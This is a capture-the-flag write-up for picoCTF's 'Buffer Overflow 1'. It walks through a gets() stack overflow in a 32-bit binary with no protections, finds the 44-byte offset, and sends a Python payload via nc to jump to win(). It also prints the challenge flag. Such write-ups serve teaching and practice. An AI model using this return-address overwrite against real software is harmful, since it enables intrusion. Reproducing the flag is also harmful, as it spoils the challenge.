# BUFFER OVERFLOW 1

## OVERVIEW & IDEA

- This challenge gives us binary and its source code.

- Checking the source code, we can see that the program has buffer overflow vuln. 

```c
#define BUFSIZE 32
[...]
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

- The idea is just overwrite `ret` of `vuln()` to `win()`

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

- Because this program is 32-bit, and has no protection, so the exploit is pretty easy.

```
λ ~/buffer_overflow_1/ file vuln

vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped

λ ~/buffer_overflow_1/ checksec --file=vuln

[*] '~/buffer_overflow_1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

## DETAILS & EXPLOIT

- Use `objdump` and I got the address of `win()`

```
λ ~/buffer_overflow_1/ objdump -D vuln | grep "win"
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
```

- Then we can make some attempts or use `cyclic` to find offset between start of `buf` and `ret`

- By some attempts I find the offset is `44 bytes`

```
λ ~/buffer_overflow_1/ python2 -c 'print("a"*44 + "\xf6\x91\x04\x08")' | nc saturn.picoctf.net 63778
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}

```